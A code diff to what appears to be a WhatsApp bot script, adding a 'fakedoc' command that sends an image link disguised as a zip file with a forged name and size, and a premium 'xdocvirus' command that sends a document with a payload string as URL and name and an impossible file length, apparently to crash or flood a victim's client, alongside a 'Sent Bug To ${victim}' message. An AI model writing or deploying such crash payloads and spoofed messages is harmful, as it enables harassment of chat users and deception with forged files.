@@ -2086,8 +2086,45 @@ case 'deldp':{
       
           }
           break
-    
+    case 'fakedoc' :
+      {
+        if (!text) return replygcxeon(`Example: ${prefix + command} docname, size`)
+          if (!/,/.test(text)) return replygcxeon(`The data you provided is invalid!, Example: \n ${prefix + command} docname, size `)
+            let docname = q.split(",")[0]
+            let docsize = q.split(",")[1]
+            
+            let quotedoc = { key: 
+              { fromMe: false, 
+                participant:'0@s.whatsapp.net', 
+                remoteJid:'status@broadcast' },
+               message: {extendedTextMessage: 
+                        { text: `Send ${docname}` }
+              }
+            }
+            let key = {}
+            try {
+              key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
+             key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
+             key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
+              key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
+            } catch (e) {
+              console.error(e)
+            }
+            XeonBotInc.sendMessage(m.chat, { delete: key })
+        XeonBotInc.sendMessage(m.chat, {
+          
+        document: {
+          url: 'https://assets.telegraphindia.com/abp/2022/Jun/1655905064_roddur.jpg'
+       },
+          
+          mimetype: 'application/zip',
+          fileName: docname,
+          fileLength: docsize,
 
+      })
+    }
+
+break
   case 'family': case 'fm' : {
       if (!m.isGroup) return XeonStickGroup()
       function getRandomPercentage() {
@@ -10755,9 +10792,9 @@ if (typemenu === 'v1') {
                     }, {})
                 } else if (typemenu === 'v7') {
                     XeonBotInc.sendMessage(m.chat, {
-                        document: {
-                           url: 'https://assets.telegraphindia.com/abp/2022/Jun/1655905064_roddur.jpg'
-                        },
+                      document: {
+                        url: 'https://assets.telegraphindia.com/abp/2022/Jun/1655905064_roddur.jpg'
+                     },
                         caption: xmenu_oh,
                         mimetype: 'application/zip',
                         fileName: ownername,
@@ -19618,6 +19655,40 @@ await sleep(3000)
 }
 }
 replygcxeon(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
+break
+case 'xdocvirus':{
+    {
+      if (!isPremium) return replygcxeon(mess.premium)
+          let key = {}
+          try {
+            key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
+           key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
+           key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
+            key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
+          } catch (e) {
+            console.error(e)
+          }
+          let quotedoc = { key: 
+            { fromMe: false, 
+              participant:'0@s.whatsapp.net', 
+              remoteJid:'status@broadcast' },
+             message: {extendedTextMessage: 
+                      { text: xeontext1 }
+            }
+          }
+      XeonBotInc.sendMessage(m.chat, {
+        
+      document: {
+        url: xeontext1
+     },
+        
+        mimetype: 'application/zip',
+        fileName: xeontext1,
+        fileLength: `9999999999999999999999999999`,
+
+    },{quoted : quotedoc})
+  }
+}
 break
 case 'docubug': {
 if (!isPremium) return replygcxeon(mess.premium)
